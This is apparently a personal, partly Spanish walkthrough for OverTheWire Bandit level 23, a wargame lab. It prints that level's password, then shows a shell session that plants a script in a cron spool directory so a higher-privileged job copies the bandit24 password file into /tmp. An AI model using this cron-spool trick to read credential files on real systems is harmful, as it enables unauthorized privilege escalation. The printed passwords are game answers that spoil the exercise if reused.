# Level 23
## Objetivo
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
## Datos de Acceso
bandit 23
QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
## Solucion
bandit23@bandit:~$ mkdir /tmp/kd bandit23@bandit:~$ cd /tmp/kd bandit23@bandit:/tmp/kd$ echo "cat /etc/bandit_pass/bandit24 > /tmp/kd/password" > script.sh bandit23@bandit:/tmp/kd$ cat script.sh cat /etc/bandit_pass/bandit24 > /tmp/kd/password bandit23@bandit:/tmp/kd$ chmod +x script.sh bandit23@bandit:/tmp/kd$ touch password bandit23@bandit:/tmp/kd$ chmod 666 password bandit23@bandit:/tmp/kd$ ls –la total 92 drwxrwxr-x 2 bandit23 bandit23 4096 Sep 4 01:51 . drwxrwx-wt 1957 root root 81920 Sep 4 01:51 .. -rw-rw-rw- 1 bandit23 bandit23 0 Sep 4 01:51 password -rwxrwxr-x 1 bandit23 bandit23 49 Sep 4 01:50 script.sh bandit23@bandit:/tmp/kd$ cp script.sh /var/spool/bandit24/foo bandit23@bandit:/tmp/kd$ ls -la total 92 drwxrwxr-x 2 bandit23 bandit23 4096 Sep 4 01:51 . drwxrwx-wt 1957 root root 81920 Sep 4 01:53 .. -rw-rw-rw- 1 bandit23 bandit23 0 Sep 4 01:51 password -rwxrwxr-x 1 bandit23 bandit23 49 Sep 4 01:50 script.sh bandit23@bandit:/tmp/kd$ date Sun Sep 4 01:54:12 AM UTC 2022 bandit23@bandit:/tmp/kd$ ls -la total 96 drwxrwxr-x 2 bandit23 bandit23 4096 Sep 4 01:51 . drwxrwx-wt 1957 root root 81920 Sep 4 01:53 .. -rw-rw-rw- 1 bandit23 bandit23 33 Sep 4 01:54 password -rwxrwxr-x 1 bandit23 bandit23 49 Sep 4 01:50 script.sh 
bandit23@bandit:/tmp/kd$ cat password 
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 
bandit23@bandit:/tmp/kd$
## Notas Adicionales
|comando|descripcion|
|xxx|xxx|
## Referencias